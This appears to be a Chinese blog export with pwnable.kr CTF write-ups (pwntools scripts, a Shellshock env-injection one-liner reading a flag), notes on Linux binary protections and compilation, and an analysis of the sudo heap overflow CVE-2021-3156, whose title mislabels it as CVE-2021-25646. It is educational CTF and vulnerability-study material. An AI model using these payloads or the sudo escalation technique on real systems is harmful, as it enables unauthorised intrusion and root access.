locale.getpreferredencoding(False) 来获取本地编码。（要读取和写入原始字节，请使用二进制模式并不要指定 encoding。）可用的模式有： 字符 含义 &#39;r&#39; 读取（默认） &#39;w&#39; 写入，并先截断文件 &#39;x&#39; 排它性创建，如果文件已存在则失败 &#39;a&#39; 写入，如果文件存在则在末尾追加 &#39;b&#39; 二进制模式 &#39;t&#39; 文本模式（默认） &#39;+&#39; 更新磁盘文件（读取并写入） 默认的模式是 &#39;r&#39; （打开并读取文本，同 &#39;rt&#39; ）。对于二进制写入， &#39;w+b&#39; 模式打开并把文件截断成 0 字节； &#39;r+b&#39; 则不会截断。 os.pipe() 创建一个管道，返回一对分别用于读取和写入的文件描述符 (r, w)。 Demo: 123456789101112131415161718192021222324252627282930#!/usr/bin/python# -*- coding: UTF-8 -*-import os, sysprint &quot;The child will write text to a pipe and &quot;print &quot;the parent will read the text written by child...&quot;# file descriptors r, w for reading and writingr, w = os.pipe() processid = os.fork()if processid: # This is the parent process # Closes file descriptor w os.close(w) r = os.fdopen(r) print &quot;Parent reading&quot; str = r.read() print &quot;text =&quot;, str sys.exit(0)else: # This is the child process os.close(r) w = os.fdopen(w, &#x27;w&#x27;) print &quot;Child writing&quot; w.write(&quot;Text written by child...&quot;) w.close() print &quot;Child closing&quot; sys.exit(0) socket模块 这个模块提供了访问BSD套接字的接口。在所有现代Unix系统、Windows、macOS和其他一些平台上可用。 这个Python接口是用Python的面向对象风格对Unix系统调用和套接字库接口的直译：函数socket() 返回一个 套接字对象 ，其方法是对各种套接字系统调用的实现。形参类型一般与C接口相比更高级：例如在Python文件 read() 和 write() 操作中，接收操作的缓冲区分配是自动的，发送操作的缓冲区长度是隐式的。 Demo: 1socket.socket(socket_family,socket_type,protocal=0) family: 套接字家族可以使 AF_UNIX 或者 AF_INET。 type: 套接字类型可以根据是面向连接的还是非连接分为 SOCK_STREAM 或 SOCK_DGRAM。 protocol: 一般不填默认为 0。 socket_family参数： 1.基于文件类型的套接字家族 套接字家族的名字：AF_UNIX，unix一切皆文件，基于文件的套接字调用的就是底层的文件系统来取数据，两个套接字进程运行在同一机器，可以通过访问同一个文件系统间接完成通信。 2.基于网络类型的套接字家族 套接字家族的名字：AF_INET，还有AF_INET6被用于ipv6，还有一些其他的地址家族，不过，他们要么是只用于某个平台，要么就是已经被废弃，或者是很少被使用，或者是根本没有实现，所有地址家族中，AF_INET是使用最广泛的一个，python支持很多种地址家族，但是由于我们只关心网络编程，所以大部分时候我么只使用AF_INET。 type指的是套接字类型，常用的类型有： SOCK_STREAM（TCP流） SOCK_DGRAM（UDP数据报） SOCK_RAW（原始套接字）最后一个 “protocol”一般设置为“0”，也就是当确定套接字使用的协议簇和类型时，这个参数的值就为0，但是有时候创建原始套接字时，并不知道要使用的协议簇和类型，也就是domain参数未知情况下，这时protocol这个参数就起作用了，它可以确定协议的种类。 socket是一个函数，那么它也有返回值，当套接字创建成功时，返回套接字，失败返回“-1”，错误代码则写入“errno”中。 一些socket函数: socket.connect(adress): 连接到 address 处的远程套接字。address 的格式取决于地址簇) socket.send(bytes[,flags]) 发送数据给套接字。本套接字必须已连接到远程套接字。 socket.close(fd) 关闭一个套接字文件描述符。它类似于os.close()，但是专用于套接字 Exp: 在/temp文件夹发现的python写的exp… 123456789101112131415161718192021222324252627282930313233343536373839#argc=100#argv[&#x27;A&#x27;]=&#x27;x00&#x27;#argv[&#x27;B&#x27;]=&#x27;\\x20\\x0a\\x0d&#x27;argc = list(&#x27;A&#x27;) * 100argc[ord(&#x27;A&#x27;)] = &#x27;&#x27;argc[ord(&#x27;B&#x27;)] = b&#x27;\\x20\\x0a\\x0d&#x27; #set socket portargc[ord(&#x27;C&#x27;)] = &quot;5555&quot;argc[0] = &#x27;/home/input2/input&#x27;#2import osstdin_r, stdin_w = os.pipe()stderr_r, stderr_w = os.pipe()os.write(stdin_w, b&#x27;\\x00\\x0a\\x00\\xff&#x27;)os.write(stderr_w, b&#x27;\\x00\\x0a\\x02\\xff&#x27;)#3environ = &#123;b&#x27;\\xde\\xad\\xbe\\xef&#x27; : b&#x27;\\xca\\xfe\\xba\\xbe&#x27;&#125;#4f = open(b&#x27;\\x0a&#x27;,&#x27;wb&#x27;)f.write(b&#x27;\\x00\\x00\\x00\\x00&#x27;)f.close()import subprocessimport timesh = subprocess.Popen(argc, stdin = stdin_r, stderr = stderr_r, env = environ)time.sleep(2)#5import sockets = socket.socket(socket.AF_INET, socket.SOCK_STREAM)s.connect((&#x27;127.0.0.1&#x27;,5555))s.send(b&#x27;\\xde\\xad\\xbe\\xef&#x27;)s.close() 另外一个Tips： t权限（粘着位SBIT）：任何人在该目录下有写权限，但是普通用户不能删除别人的文件 查看到tmp目录下普通用户有-wt权限，我们进入tmp目录后创建自己的一个目录然后执行a.py 注意到当前目录下并没有flag，我们需要创建软连接 1ln /home/input/flag flag legARM汇编： 这篇一步到位。点我 1234567891011(gdb) disass key1Dump of assembler code for function key1: 0x00008cd4 &lt;+0&gt;: push &#123;r11&#125; ; (str r11, [sp, #-4]!) 0x00008cd8 &lt;+4&gt;: add r11, sp, #0 0x00008cdc &lt;+8&gt;: mov r3, pc 0x00008ce0 &lt;+12&gt;: mov r0, r3 0x00008ce4 &lt;+16&gt;: sub sp, r11, #0 0x00008ce8 &lt;+20&gt;: pop &#123;r11&#125; ; (ldr r11, [sp], #4) 0x00008cec &lt;+24&gt;: bx lrEnd of assembler dump. 1.返回值存储在r0寄存器 ARM处理器有两种工作状态：ARM状态和Thumb状态。处理器可以在两种状态下随意切换。 处于ARM状态时，执行32位字对齐的ARM指令。 处于Thumb状态时，执行16位对齐的Thumb指令。 2.两种工作状态： ARM 和 Thumb 指令集的动态切换，是通过 BX 指令使用一个寄存器名作为参数来完成。程序控制权被转交给该寄存器中存储的地址 ( LSB 位被屏蔽 )。 如果 LSB=1, 则进入 Thumb 指令处理模式； 如果 LSB=0, 则进入 ARM 指令处理模式。 通俗点讲其实就是BX 跳转的地址最低位为1还是0来判断是进入Thumb指令处理模式还是进人ARM指令处理模式 3.Thumb模式下PC值=当前指令地址值+8 key1=0x00008cdc+8 1234567891011121314151617(gdb) disass key2Dump of assembler code for function key2: 0x00008cf0 &lt;+0&gt;: push &#123;r11&#125; ; (str r11, [sp, #-4]!) 0x00008cf4 &lt;+4&gt;: add r11, sp, #0 0x00008cf8 &lt;+8&gt;: push &#123;r6&#125; ; (str r6, [sp, #-4]!) 0x00008cfc &lt;+12&gt;: add r6, pc, #1 0x00008d00 &lt;+16&gt;: bx r6 ;此时r6最后一位是1,进入ARM thumb模式 pc&#x3D;adress+4 0x00008d04 &lt;+20&gt;: mov r3, pc 0x00008d06 &lt;+22&gt;: adds r3, #4 0x00008d08 &lt;+24&gt;: push &#123;r3&#125; 0x00008d0a &lt;+26&gt;: pop &#123;pc&#125; 0x00008d0c &lt;+28&gt;: pop &#123;r6&#125; ; (ldr r6, [sp], #4) 0x00008d10 &lt;+32&gt;: mov r0, r3 0x00008d14 &lt;+36&gt;: sub sp, r11, #0 0x00008d18 &lt;+40&gt;: pop &#123;r11&#125; ; (ldr r11, [sp], #4) 0x00008d1c &lt;+44&gt;: bx lrEnd of assembler dump. 这里返回值由r3传入。然后再看一下地址 0x00008d00 &lt;+16&gt;这里，有个bx r6，而r6等于pc+1即0x8d05，最低为为1，所以执行bx r6之后会进入thumb模式，这样就会变成2字节对齐，pc存储着当前指令加4的位置，如此一来，下面的mov r3,pc中，r3等于0x8d04+0x4。下一条为adds r3，#4，表示r3 = r3 + 4后更新标志位，因此r3 = 0x8d04 + 0x4 + 0x4。 key2=0x8d04 + 0x4 + 0x4 123456789101112(gdb) disass key3Dump of assembler code for function key3: 0x00008d20 &lt;+0&gt;: push &#123;r11&#125; ; (str r11, [sp, #-4]!) 0x00008d24 &lt;+4&gt;: add r11, sp, #0 0x00008d28 &lt;+8&gt;: mov r3, lr 0x00008d2c &lt;+12&gt;: mov r0, r3 0x00008d30 &lt;+16&gt;: sub sp, r11, #0 0x00008d34 &lt;+20&gt;: pop &#123;r11&#125; ; (ldr r11, [sp], #4) 0x00008d38 &lt;+24&gt;: bx lrEnd of assembler dump. 最终key3=lr的值 lr寄存器也即R14寄存器，用作子程序链接，称为链接寄存器LK (Link Register)。 作用：使用BL或BLX时，跳转指令自动把返回地址放入r14中；子程序通过把r14复制到PC来实现返回 在main函数找到调用key时的代码 120x00008d7c &lt;+64&gt;: bl 0x8d20 &lt;key3&gt;0x00008d80 &lt;+68&gt;: mov r3, r0 BL指令： B或BL指令引起处理器转移到“子程序名”处开始执行。两者的不同之处在于:(1)BL指令在转移到子程序执行之前，将其下一条指令的地址拷贝到R14（LR,链接寄存器）。 由于BL指令保存了下条指令的地址，因此使用指令“MOV PC ,LR”即可实现子程序的返回。(2)B指令则无法实现子程序的返回，只能实现单纯的跳转。用户在编程的时候，可根据具体应用选用合适的子程序调用语句。 key3=0x8d80 三个数相加即可 Exp: 108400 mistake符号优先级相关 1if(!(len=read(fd,pw_buf,PW_LEN) &gt; 0)) 比较运算符优先级高于赋值运算符，因此实际上fd最终并不是理想的文件描述符，而是0才对，而另一方面，0作为文件描述符，它指向的是stdin。 两个输入都由我们构造，自由发挥即可。。 Exp: 1234567891011#coding=utf-8from pwn import *shell=ssh(host=&#x27;pwnable.kr&#x27;,user=&#x27;mistake&#x27;,password=&#x27;guest&#x27;,port=2222)sh=shell.run(&#x27;./mistake&#x27;)payload=&#x27;B&#x27;*10sh.sendafter(&quot;do not bruteforce...\\n&quot;,payload)payload=&#x27;C&#x27;*10sh.sendafter(&quot;input password : &quot;,payload)sh.interactive() shellshockCVE-2014-6271（破壳漏洞）面向Google解题 Link Exp: 12345678#coding=utf-8from pwn import *shell=ssh(host=&#x27;pwnable.kr&#x27;,user=&#x27;shellshock&#x27;,password=&#x27;guest&#x27;,port=2222)sh=shell.run(&#x27;sh&#x27;)sh.sendline(&quot;env x=&#x27;() &#123; :;&#125;; bash -c \\&quot;cat flag\\&quot; &#x27; ./shellshock&quot;)sh.interactive() coin1blackjacklottocmd1cmd2uafmemcpyasmunlinkblukathorcruxes","categories":[{"name":"Pwn","slug":"Pwn","permalink":"http://example.com/categories/Pwn/"}],"tags":[{"name":"Pwn","slug":"Pwn","permalink":"http://example.com/tags/Pwn/"},{"name":"CTF","slug":"CTF","permalink":"http://example.com/tags/CTF/"}]},{"title":"Linux程序保护机制","slug":"Linux程序保护机制","date":"2021-04-17T18:32:31.798Z","updated":"2021-04-17T18:48:23.671Z","comments":true,"path":"2021/04/18/Linux程序保护机制/","link":"","permalink":"http://example.com/2021/04/18/Linux%E7%A8%8B%E5%BA%8F%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/","excerpt":"","text":"Linux程序保护机制​ 在Pwnable.kr刷题的过程中一点一点地了解了linux系统下的一些安全机制来降低程序受到溢出等攻击，这里简单做个总结。:) Tools:checksecchecksec是一个检查linux程序开启的安全机制的shell脚本，也可以检测packer信息 （Demo: 题目:flag 下面对逐个介绍保护机制 CANARY​ 在linux程序中，CANARY是一种栈保护机制，栈保护机制开启后，函数执行时会先往栈中插入随机值，这个随机值就被称为CANARY，当函数返回时，会先验证这个随机数是否被更改，如果被更改说明有栈溢出行为，就会使程序强制停止，从而规避栈溢出带来的危害。 ​ Function： 1、在所有函数调用发生时，向栈帧内压入一个额外的随机 DWORD，这个随机数被称作“canary”，用 IDA 反汇编时，又被称作“Security Cookie”。 2、canary 位于 EBP 之前，系统还会在.data 的内存区域中存放一个 canary 的副本。 3、 当栈中发生溢出时，canary 将被首先淹没，之后才是 EBP 和返回地址。 4、 在函数返回之前，系统将执行一个额外的安全验证操作，称作 Security Check。 5、在 Security Check 过程中，系统将比较栈帧中原先存放的 canary 和.data 中副本的值，若两者不同，则说明栈中发生了溢出，系统将进入异常处理流程，函数不会正常返回。 FORTIFYFORTIFY机制用于检查程序是否存在缓冲区溢出错误。这是一个由GCC实现的源码级别的保护机制，其功能是在编译的时候检查源码以避免潜在的缓冲区溢出等错误。适用于memcpy，memset，stpcpy，strcpy，strncpy，strcat，strncat，sprintf，snprintf，vsprintf，vsnprintf，gets等函数。 在函数编译时，加入FORTIFY机制的代码会在编译过程中自动添加一部分代码，判断数组的大小，削减缓冲区溢出的危害。 gcc编译时，默认不开启FORTIFY机制，可通过编译选项选择开启的FORTIFY机制强度 NXNX:no-excute不可执行 基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。 PIE（ASLR）PIE一般与ASLR地址分布随机化(address space layout randomization)同时工作 内存地址随机化机制几种情况：1230 - 表示关闭进程地址空间随机化。1 - 表示将mmap的基址，stack和vdso页面随机化。2 - 表示在1的基础上增加栈（heap）的随机化。 RELRORELRO:read only relocation 由linker指定binary的一块经过dynamic linker处理过 relocation之后的区域为只读. 作用：设置符号重定向表格为只读或在程序启动时就解析并绑定所有动态符号，从而减少对GOT（Global Offset Table）攻击。RELRO为” Partial RELRO”，说明我们对GOT表具有写权限。 Summary了解以上内存保护机制的信息会为我们pwn提供一些信息。","categories":[{"name":"linux","slug":"linux","permalink":"http://example.com/categories/linux/"}],"tags":[{"name":"linux","slug":"linux","permalink":"http://example.com/tags/linux/"},{"name":"Pwn","slug":"Pwn","permalink":"http://example.com/tags/Pwn/"},{"name":"程序保护机制","slug":"程序保护机制","permalink":"http://example.com/tags/%E7%A8%8B%E5%BA%8F%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/"}]},{"title":"Linux代码编译过程","slug":"Linux环境下编译过程","date":"2021-04-11T16:05:33.539Z","updated":"2021-04-11T16:05:11.515Z","comments":true,"path":"2021/04/12/Linux环境下编译过程/","link":"","permalink":"http://example.com/2021/04/12/Linux%E7%8E%AF%E5%A2%83%E4%B8%8B%E7%BC%96%E8%AF%91%E8%BF%87%E7%A8%8B/","excerpt":"","text":"Linux下Hello World的前生今世代码引入hello.c 1234567#include &lt;stdio.h&gt;int main(int argc,char *argv[],char *envp[])&#123; printf(&quot;Hello World\\n&quot;); return 0;&#125; linux环境下我们可以通过GCC编译hello.c: 1$ gcc -g hello.c -o hello 当前目录先会生成hello可执行文件。 main函数的三个参数int argc int型变量，表示传递给main函数的参数数量。 char *argv 指针数组，每个指针指向各个具体的参数。 char*envp 环境变量，可以为程序运行过程中需要使用环境变量做参考。 Demo: 1$ ./hello //执行该文件 此时argc=1,表示只有一个参数输入 argv只有一个元素,argv[0]指向输入程序路径及名称: ./hello 1$ ./hello para_1 此时argc=2,有两个参数传入 argc[0]指向输入程序路径及名称 “./hello” argv[1]指向para_1字符串 what’s gccGCC是GNU Compiler Collection的缩写，GCC是一系列编译器的集合，是Linux操作系统的核心组件之一。GCC最初名为GNU C Compiler，当时它只是一款C语言的编译器，不过随着后续迭代，它支持C++、Fortran、Go等语言，GCC也因此成为一个编译器集合。GCC有以下特点： GCC支持的编程语言多。比如，g++是C++编译器，gfortran是Fortran编译器。 GCC支持的硬件全。GCC可以将源代码编译成x86_64、ARM、PowerPC等硬件架构平台的可执行文件。 GCC支持众多业界标准。GCC能很快支持最新的C++标准，GCC支持OpenMP、OpenACC。 编译过程分析 预处理预处理器CPP工具进行预处理 1$ cpp hello.c -o hello.i 预编译主要处理源代码中以#开始的预编译指令，主要处理规则如下： 处理#include 预编译指令，将被包含的文件插入到该预编译指令的位置。这是一个递归的过程，如果被包含的文件还包含了其他文件，会递归地完成这个过程。 处理条件预编译指令，比如#if、#ifdef、#elif、#else、#endif。 删除#define，展开所有宏定义。 添加行号和文件名标识，以便于在编译过程中产生编译错误或者调试时都能够生成行号信息。 编译gcc对预处理后的hello.i文件惊醒编译。编译的过程主要是进行词法分析、语法分析、语义分析，这背后涉及编译原理等一些内容。这里只进行编译，不汇编，可以生成硬件平台相关的汇编语言。 1$ gcc -S hello.i -o hello.s 它包含一个汇编语言程序，即将C语言程序编译成汇编语言程序。 汇编1$ as hello.s -o hello.o as工具将hello.s文件翻译为二进制代码。 虽然这个文件已经是二进制的机器码了，但是它仍然不能执行，因为它缺少系统运行所必须的库，比如C语言printf()对应的汇编语言的puts函数。确切的说，系统还不知道puts函数在内存中的具体位置。如果我们在一份源代码中使用了外部的函数或者变量，还需要重要的一步：链接。 链接1$ gcc hello.o -o hello 该命令是基于动态链接的方式，生成的hello已经是一个可执行文件。实际上，这个命令隐藏了很多背后的内容。 main()方法是C语言程序的入口，crt1.o这几个库是在处理main()方法调用之前和程序退出之后的事情，这需要与操作系统协作。在Linux中，一个新的程序都是由父进程调用fork()，生成一个子进程，然后再调用execve()，将可执行文件加载进来，才能被操作系统执行。所以，准确地说，main()方法是这个程序的入口，但仅仅从main()方法开始，并不能顺利执行这个程序。 链接器将多个目标文件合并成一个可执行目标文件，这个二进制文件包含加载程序到内存并运行的所有信息。 链接过程主要包含了两个步骤： 地址与空间分配（Address and Storage Allocation） 这个过程中， 扫描所有的输入目标文件，获得它们的各个节的长度、属性、位置，并将输入目标文件中的符号表中所有的符号定义和符号引用收集起来，统一放到一个全局的符号表。这一步，链接器能够获得所有输入目标文件的节的长度，并将它们合并，计算出输出文件中各个节合并后的长度与位置，并建立映射关系。 这里引入可执行目标文件的概念。 .text:已编译程序的机器代码 .rodata:只读数据 .data:已初始化的全局和静态C变量 .bss:未初始化的全局和静态C变量 .symtab: 符号表，存放在程序中定义和引用的函数和全局变量的信息 .debug:调试符号表 可执行文件中的段是由目标文件中的节合并而来的，以下是链接器如何将它们的各个节合并到输出文件，也即输出文件中的空间如何分配给输入文件的两种方式。 顺序叠加 虽然这种方法非常简单，但是它存在一个问题：在有很多输入文件的情况下，输出文件会有很多零散的节。这种做法非常浪费空间，因为每个节都需要有一定的地址和空间对齐要求。x86硬件的对齐要求是4KB。如果一个节的大小只有1个字节，它也要在内存在重用4KB。这样会造成大量内部碎片。所以不是一个好的方案。 合并相似节 一个更加实际的方法便是合并相同性质的节，比如：将所有输入文件的 .text节合并到输出文件的 text段（注意，此时出现了段和节两个概念），如下图所示。 其中.bss节在目标文件和可执行文件中不占用文件的空间，但是它在装载时占用地址空间。事实上，这里的空间和地址有两层含义: 在输出的可执行文件中的空间 在装载后的虚拟地址中的空间 对于有实际数据的节，如.text和.data，它们在文件中和虚拟地址中都要分配空间，因为它们在这两者中都存在；对于.bss来，分配空间的意义只局限于虚拟地址空间，因为它在文件中并没有内容。我们在这里谈到的空间分配只关注于虚拟地址空间（见下图）的分配，因为这关系到链接器后面的关于地址计算的步骤，而可执行文件本身的空间分配与链接的关系并不大。 现在的链接器空间分配的策略基本上都采用“合并相似节”的方法，使用这种方法的链接器一般采用一种叫 两步链接（Two-pass Linking） 的方法。即整个链接过程分为地址与空间分配和符号解析、重定位。 符号解析（Symbol Resolution）和重定位（Relocation） 使用前一步中收集到的所有信息，读取输入文件中节的输数据、重定位信息，并且进行符号解析与重定位、调整代码、调整代码中的地址等。重定位是链接过程的核心。在地址与空间分配步骤完成之后，相似权限的节会被合并成段，并生成了 程序头表（Program Header Table） 结构。如下图可执行文件结构所示，主要生成两个段：代码段（ text段）、数据段（ data段 ）。 符号解析 重定位的过程是伴随着符号解析的，这里先介绍符号解析。 链接器解析符号引用的方法是将每个引用与它输入的可重定位目标文件的符号表中的一个确定的符号定义关联起来。对那些和引用定义在相同模块的局部符号的引用，符号解析是非常简单的。编译器只允许每个模块中每个局部符号有一个定义。静态局部变量也会有本地链接器符号，编译器还要确保它们拥有唯一的名字。 然而，对于全局符号的解析要复杂得多。当编译器遇到一个不是在当前模块中定义的符号（变量或函数名）时，会假设该符号是在其他某个模块中定义的，生成一个链接器符号表条目，并把它交给链接器处理。如果链接器在它的任何输入模块中都找不到这个被引用符号的定义，就输出一条错误信息并终止。 多重定义的全局符号解析在此不做介绍。 重定位 链接的前两步完成之后，链接器就已经确定所有符号的虚拟地址了，那么链接器就可以根据符号的地址对每个需要重定位的指令进行地址修正。 那么链接器如何知道哪些指令是要被调整的呢？事实上，我们前面提到的ELF文件中的 重定位表（Relocation Table） 专门用来保存这些与重定位相关的信息。 对于可重定位的ELF文件来说，它必须包含重定位表，用来描述如何修改相应的节的内容。对于每个要被重定位的ELF节都有一个对应的重定位表。如果.text节需要被重定位，则会有一个相对应叫.rel.text的节保存了代码节的重定位表；如果.data节需要被重定位，则会有一个相对应的.rel.tdata的节保存了数据节的重定位表。 链接可分为静态链接和动态链接 静态链接简单来说，静态链接就是在程序加载前，将所依赖的第三方库函数都打包到了一起，形成一个非常大的可执行文件。如下图所示为最基本的静态链接过程示意图。每个模块的源代码文件（如.c）文件经过编译器编译成目标文件（Object File，一般扩展名为.o或.obj）。目标文件和 库（Library） 一起链接形成最终的可执行文件。其中，最常见的库就是运行时库（Runtime Library），它是支持程序运行的基本函数的集合。库本质上是一组目标文件的包，由一些最常用的代码编译成目标文件后打包而成。 动态链接动态链接是在运行时，发现用到某些库中的某些函数时，再从这些第三方库中读取自己所需的方法。 动态链接的基本实现 动态链接涉及运行时的链接以及多个文件的装载，必需要有操作系统的支持。因为动态链接的情况下，进程的虚拟地址空间的分布会比静态链接情况下更为复杂，还有一些存储管理、内存共享、进程线程等机制在动态链接下也会有一些微妙的变化。 目前，主流操作系统都支持动态链接。在Linux中，ELF动态链接文件被称为 动态共享对象（DSO，Dynamic Shared Objects），一般以.so为后缀；在Windows中，动态链接文件被称为 动态链接库（Dynamic Linking Library），一般以.dll为后缀。 在Linux中，常用的C语言库的运行库glibc，其动态链接形式的版本保留在 /lib目录下，文件名为 libc.so。整个系统只保留一份C语言动态链接文件libc.so，所有的C语言编写的、动态链接的程序都可以在运行时使用它。当程序被装载时，系统的动态链接器会将程序所需要的所有动态链接库装载到进程的地址空间，并将程序中所有未解析的符号绑定到相应的动态链接库中，并进行重定位。 动态链接程序运行时地址空间分布 对于静态链接的可执行文件来说，整个进程只有一个文件要被映射，即可执行文件。而对于动态链接，除了可执行文件，还有它所依赖的共享目标文件。 关于共享目标文件在内存中的地址分配，主要有两种解决方案，分别是： 静态共享库（Static Shared Library）（地址固定） 动态共享库（Dynamic Shared Libary）（地址不固定） 静态共享库 静态共享库的做法是将程序的各个模块统一交给操作系统进行管理，操作系统在某个特定的地址划分出一些地址块，为那些已知的模块预留足够的空间。因为这个地址对于不同的应用程序来说，都是固定的，所以称之为静态。 但是静态共享库的目标地址会导致地址冲突、升级等问题。 动态共享库 采用动态共享库的方式，也称为装载时重定位（Load Time Relocation）。其基本思路是：在链接时，对所有绝对地址的引用都不作重定位，而把这一步推迟到装载时再完成。一旦模块装载地址确定，即目标地址确定，那么系统就对程序中所有的绝对地址引用进行重定位。 但是这种方式也存在一些问题。比如，动态链接模块被装载映射至虚拟空间后，指令部分是在多个进程间共享的，由于装载时重定位的方法需要修改指令，所以没有办法做到同一份指令被多个进程共享，因为指令被重定位后对于每个进程来说都是不同的。 然后，动态链接库中的代码是共享的，但是其中的可修改数据部分对于不同进程来说是由多个副本的。基于此，一种名为地址无关代码的技术被提出以克服这个问题。 与地址无关 无论何种操作系统上，使用动态链接生成的目标文件中凡是涉及第三方库的函数调用都是地址无关的。我们自己编写的程序名为hello.c，hello.c中调用了C标准库的printf()，在生成的目标文件中，不会立即确定printf()的具体地址，而是在运行时去装载这个函数，在装载阶段确定printf()的地址。这里提到的地址指的是进程在内存上的虚拟地址。动态链接库的函数地址在编译时是不确定的，在装载时，装载器根据当前地址空间情况，动态地分配一块虚拟地址空间。 小结在会写一个C程序，也要了解一个C代码是如何从ASCII文件一步步变为可执行文件的过程。","categories":[{"name":"linux","slug":"linux","permalink":"http://example.com/categories/linux/"}],"tags":[{"name":"linux","slug":"linux","permalink":"http://example.com/tags/linux/"},{"name":"编译过程","slug":"编译过程","permalink":"http://example.com/tags/%E7%BC%96%E8%AF%91%E8%BF%87%E7%A8%8B/"},{"name":"链接","slug":"链接","permalink":"http://example.com/tags/%E9%93%BE%E6%8E%A5/"}]},{"title":"CVE-2021-25646堆溢出漏洞复现及分析","slug":"CVE-2021-3156","date":"2021-04-10T03:26:10.677Z","updated":"2021-04-10T06:32:38.500Z","comments":true,"path":"2021/04/10/CVE-2021-3156/","link":"","permalink":"http://example.com/2021/04/10/CVE-2021-3156/","excerpt":"","text":"CVE-2021-25646堆溢出漏洞复现及分析漏洞详情​ 当在类Unix的操作系统上执行命令时，非root用户可以使用sudo命令来以root用户身份执行命令。由于sudo错误地在参数中转义了反斜杠导致堆缓冲区溢出，从而允许任何本地用户（无论是否在sudoers文件中）获得root权限，无需进行身份验证，且攻击者不需要知道用户密码。 ​ 影响范围： ​ Sudo 1.8.2 - 1.8.31p2 ​ Sudo 1.9.0 - 1.9.5p1 漏洞原理分析​ 对于bash而言假如我们希望执行某个命令可以使用bash -c [command]来执行，如果我们希望以root的权限去执行某个命令的话可以直接sudo [cmd]，而如果我们希望以shell模式去执行某个命令的时候，可以使用sudo -i或者sudo -s参数，在参数说明里我们可以看到-i, --login run login shell as the target user; a command may also be specified， -s, --shell run shell as the target user; a command may also be specified，当我们使用上述参数时对于sudo的flags而言有两种情况： 使用sudo -s，设置MO DE_SHELL 使用sudo -i，设置MODE_SHELL|MODE_LOGIN_SHELL ​ 在src/parse_args.c里我们可以看到对于这种模式的参数处理，处理方式为将参数按照空格拼接起来，对于一些元字符使用反斜线进行转义处理，最终覆写了argv为ac这个指针数组。 ​ 源码分析： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455/* * For shell mode we need to rewrite argv */ if (ISSET(mode, MODE_RUN) &amp;&amp; ISSET(flags, MODE_SHELL)) &#123; char **av, *cmnd = NULL; int ac = 1; if (argc != 0) &#123; /* shell -c &quot;command&quot; */ char *src, *dst; //得到命令的长度 size_t cmnd_size = (size_t) (argv[argc - 1] - argv[0]) + strlen(argv[argc - 1]) + 1; cmnd = dst = reallocarray(NULL, cmnd_size, 2); if (cmnd == NULL) sudo_fatalx(U_(&quot;%s: %s&quot;), __func__, U_(&quot;unable to allocate memory&quot;)); if (!gc_add(GC_PTR, cmnd)) exit(1); //拼接命令并且处理转移符 for (av = argv; *av != NULL; av++) &#123; for (src = *av; *src != &#x27;\\0&#x27;; src++) &#123; /* quote potential meta characters */ if (!isalnum((unsigned char)*src) &amp;&amp; *src != &#x27;_&#x27; &amp;&amp; *src != &#x27;-&#x27; &amp;&amp; *src != &#x27;$&#x27;) *dst++ = &#x27;\\\\&#x27;;//处理转义字符，&#x27;\\\\&#x27;表示反斜线 *dst++ = *src; &#125; *dst++ = &#x27; &#x27;; &#125; if (cmnd != dst) dst--; /* replace last space with a NUL */ *dst = &#x27;\\0&#x27;; ac += 2; /* -c cmnd */ &#125; //上述处理完毕后结果保存在dst指针指向的内存 av = reallocarray(NULL, ac + 1, sizeof(char *)); //分配新的内存保存拼接的命令 if (av == NULL) sudo_fatalx(U_(&quot;%s: %s&quot;), __func__, U_(&quot;unable to allocate memory&quot;)); if (!gc_add(GC_PTR, av)) exit(1); av[0] = (char *)user_details.shell; /* plugin may override shell */ if (cmnd != NULL) &#123; av[1] = &quot;-c&quot;; av[2] = cmnd; &#125; av[ac] = NULL; //最后的形式为 shell -c cmnd(shell和环境变量相关，比如我这里是zsh，shell为/usr/bin/zsh) //最终用av覆写argv argv = av; argc = ac; &#125; ​ 随后在sudoers.c中的sudoers_policy_main函数中调用set_cmnd将命令行参数存放在一个堆上的数据结构user_args中，这里也对元字符做了处理，假如不是\\\\+space的形式就跳过元字符，否则拷贝到*to。那么假如我们的命令行参数以\\\\结尾，那么from[0]=&#39;\\\\&#39;;from[1]=NULL(注意NULL并非sapce范围)，此时from++指向空字符，下面将空字符拷贝到了*to并且from++后执行了NULL后面的字符，此时再次进行while循环判断时很明显这里是可以继续进入循环的(如果后一个字符不为NULL)，从而赋值得以继续进行，从而产生了溢出。 1234567891011121314151617if (ISSET(sudo_mode, MODE_SHELL|MODE_LOGIN_SHELL)) &#123; /* * When running a command via a shell, the sudo front-end * escapes potential meta chars. We unescape non-spaces * for sudoers matching and logging purposes. */ for (to = user_args, av = NewArgv + 1; (from = *av); av++) &#123; while (*from) &#123; if (from[0] == &#x27;\\\\&#x27; &amp;&amp; !isspace((unsigned char)from[1])) from++; *to++ = *from++; &#125; *to++ = &#x27; &#x27;; &#125; *--to = &#x27;\\0&#x27;; &#125; set_cmnd()存在越界写，溢出user_args堆缓冲区（size是在852-853行中计算）。根本原因就是，sudo默认 \\ 后面肯定跟着元字符，实际上后面只有1个结束符。 当from指向\\时，from[1]指向NULL字节，from[2]指向的就是环境变量的第一个字节了，执行*too=*from++，可以将后面的NULL字节拷贝到user_args的堆中，且让from++，从而避开了while(*from）判断是否读到NULL字节的检测，由于参数后面紧跟环境变量的值，因此通过设置环境变量的值来覆盖user_args堆后面的数据。 ​ 上述是我们的理论分析，在理论角度上看漏洞是存在的，但是我们在之前的漏洞中也见到过由于无法创造漏洞利用场景(比如我想提权但是exp里需要某个root用户给的capability)，这样的洞就非常鸡肋。那么在我们的分析里有几个理想条件，那么最后的这个场景，即反斜线作为cmd-line的最后一个字符从理论上来说是无法实现的，这里要求我们有MODE_SHELL|MODE_LOGIN_SHELL，而假如flag包含MODE_SHELL的话在我们之前的parse_args参数解析中就会将所有元字符给转义掉，也就是说会有两个反斜线，我们再按照代码走一遍会发现这样循环末尾的*from=NULL，因此会跳出循环。 ​ 再仔细对比一下二者的条件，二者的条件略有不同。我们的问题在于能否设置flag为MODE_SHELL以及MODE_RUN或者MODE_EDIT或者MODE_CHECK。 ​ 再看下解析参数的部分会发现好像还是不太行，假如我们使用-e参数设置MODE_EDIT或者使用-l参数设置MODE_CHECK，我们的MODE_SHELL参数就会被从valid_flags去掉。 12345678910//bug conditionif (sudo_mode 